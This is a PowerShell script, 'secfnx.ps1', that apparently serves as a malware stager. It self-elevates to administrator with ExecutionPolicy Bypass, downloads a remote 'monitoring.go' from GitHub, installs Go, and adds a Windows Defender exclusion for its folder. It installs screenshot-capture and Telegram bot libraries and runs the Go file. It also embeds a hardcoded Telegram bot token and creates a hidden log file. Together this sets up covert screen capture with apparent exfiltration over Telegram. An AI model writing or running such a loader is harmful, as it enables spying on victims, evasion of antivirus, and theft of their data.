# secfnx.ps1
# Downloads Go MSI, sets up environment, downloads monitoring.go, and runs it as a script
# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx.ps1

param(
    [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
    [switch]$Auto,
    [switch]$RunHidden
)

# Config
$LogFile = Join-Path $env:TEMP "download_runner.log"
$MsiName = "go1.24.7.windows-amd64.msi"
$MsiUrl = "https://go.dev/dl/go1.24.7.windows-amd64.msi"
$Url = "https://github.com/ArthOfficial/TEST/blob/main/monitoring.go"
$GoInstallDir = "C:\Program Files\Go"
$GoBinPath = Join-Path $GoInstallDir "bin"
$GoFileName = "monitoring.go"
$DestFolder = Join-Path $env:USERPROFILE "Downloads\secfnx"
$GoFilePath = Join-Path $DestFolder $GoFileName
$PathLog = Join-Path $DestFolder "path_sec.log"
$LogMaxSize = 10MB

# Status Output Helper
function Status-Output {
    param(
        [string]$Message,
        [bool]$Success
    )

    if ($Success) {
        Write-Host "[True] $Message"
    } else {
        Write-Host "[False] $Message"
    }
}

# Logging
function Log {
    param($Message)
    $Line = "$(Get-Date -Format o) - $Message"
    if (Test-Path $LogFile) {
        $LogSize = (Get-Item $LogFile).Length
        if ($LogSize -ge $LogMaxSize) {
            $BackupLog = "$LogFile.$(Get-Date -Format 'yyyyMMddHHmmss').bak"
            Rename-Item $LogFile $BackupLog -ErrorAction SilentlyContinue
        }
    }
    Add-Content -Path $LogFile -Value $Line -ErrorAction SilentlyContinue
    Write-Output $Line
}

function Log-Path {
    param($Path, $Type)
    $Line = "$(Get-Date -Format o) - ${Type}: $Path"
    Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue
}

function Test-IsAdmin {
    try {
        ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        $false
    }
}

function Download-File($SourceUrl, $OutPath) {
    Log "Downloading $SourceUrl -> $OutPath"
    try {
        $ProgressPreference = 'Continue'
        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -ErrorAction Stop
        Log-Path $OutPath "File Downloaded"
        Status-Output "Downloaded $OutPath" $true
        return $true
    } catch {
        Log "Download failed: $_"
        Status-Output "Downloaded $OutPath" $false
        return $false
    } finally {
        $ProgressPreference = 'SilentlyContinue'
    }
}

function Add-ToSystemPath($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot modify PATH: not admin"
        Status-Output "Add to PATH $Path" $false
        return $false
    }
    try {
        $CurrentPath = [Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
        if ($CurrentPath -notlike "*$Path*") {
            $NewPath = "$CurrentPath;$Path"
            [Environment]::SetEnvironmentVariable("Path", $NewPath, [System.EnvironmentVariableTarget]::Machine)
            Log "System PATH updated"
            Status-Output "Add to PATH $Path" $true
            return $true
        }
        Status-Output "Add to PATH $Path (already exists)" $true
        return $true
    } catch {
        Log "Failed to update PATH: $_"
        Status-Output "Add to PATH $Path" $false
        return $false
    }
}

function Add-DefenderExclusion($Path) {
    if (-not (Test-IsAdmin)) {
        Log "Cannot add Defender exclusion: not admin"
        Status-Output "Defender Exclusion $Path" $false
        return $false
    }
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        Log "Exclusion added"
        Status-Output "Defender Exclusion $Path" $true
        return $true
    } catch {
        Log "Failed to add Defender exclusion: $_"
        Status-Output "Defender Exclusion $Path" $false
        return $false
    }
}

function Install-Go {
    $MsiPath = Join-Path $DestFolder $MsiName
    if (Test-Path (Join-Path $GoInstallDir "bin\go.exe")) {
        Log "Go already installed at $GoInstallDir"
        Status-Output "Install Go" $true
        return $true
    }
    if (-not (Test-IsAdmin)) {
        Log "Cannot install Go: not admin"
        Status-Output "Install Go" $false
        return $false
    }
    if (-not (Download-File $MsiUrl $MsiPath)) {
        Status-Output "Install Go" $false
        return $false
    }
    try {
        $Args = "/i `"$MsiPath`""
        $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
        if ($Proc.ExitCode -ne 0) {
            Log "Go MSI install failed: exit code $($Proc.ExitCode)"
            Status-Output "Install Go" $false
            return $false
        }
        Add-ToSystemPath $GoBinPath
        [Environment]::SetEnvironmentVariable("GOROOT", $GoInstallDir, [System.EnvironmentVariableTarget]::Machine)
        Status-Output "Install Go" $true
        return $true
    } catch {
        Log "Go MSI install error: $_"
        Status-Output "Install Go" $false
        return $false
    }
}

function Install-GoDependencies($GoFile) {
    if (-not (Test-Path $GoFile)) { Status-Output "Install Dependencies" $false; return $false }
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        $GoMod = Join-Path $DestFolder "go.mod"
        $GoSum = Join-Path $DestFolder "go.sum"
        if (Test-Path $GoMod) { Remove-Item $GoMod -Force -ErrorAction SilentlyContinue; Log-Path $GoMod "File Deleted" }
        if (Test-Path $GoSum) { Remove-Item $GoSum -Force -ErrorAction SilentlyContinue; Log-Path $GoSum "File Deleted" }

        Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Status-Output "Initialize Go Module" $true
        Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Status-Output "Install Dependencies" $true
        return $true
    } catch {
        Log "Dependency install error: $_"
        Status-Output "Install Dependencies" $false
        return $false
    }
}

function Run-GoScript($GoFile) {
    if (-not (Test-Path $GoFile)) { Status-Output "Run Go Script" $false; return $false }
    try {
        $Env:PATH = "$Env:PATH;$GoBinPath"
        Start-Process -FilePath "go" -ArgumentList "run", $GoFile -WorkingDirectory $DestFolder -Wait -NoNewWindow
        Status-Output "Run Go Script" $true
        return $true
    } catch {
        Log "Failed to run Go script: $_"
        Status-Output "Run Go Script" $false
        return $false
    }
}

# Main
if (-not (Test-IsAdmin)) {
    Start-Process powershell -Verb RunAs -ArgumentList "-ExecutionPolicy Bypass -NoProfile -File `"$PSScriptRoot\$($MyInvocation.MyCommand.Name)`""
    exit
}

if (-not (Test-Path $DestFolder)) { New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null; Status-Output "Create Folder" $true }

if (-not (Test-Path $PathLog)) { New-Item -Path $PathLog -ItemType File -Force | Out-Null; Set-ItemProperty -Path $PathLog -Name Attributes -Value "Hidden"; Status-Output "Create Path Log" $true }

if ($Url -match "github.com/.+/blob/(.+)$") { $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/" }

if (-not (Download-File $Url $GoFilePath)) { exit 1 }
if (-not (Install-Go)) { exit 1 }
Add-DefenderExclusion $DestFolder
if (-not (Install-GoDependencies $GoFilePath)) { exit 1 }
Run-GoScript $GoFilePath
Status-Output "Script Completed" $true
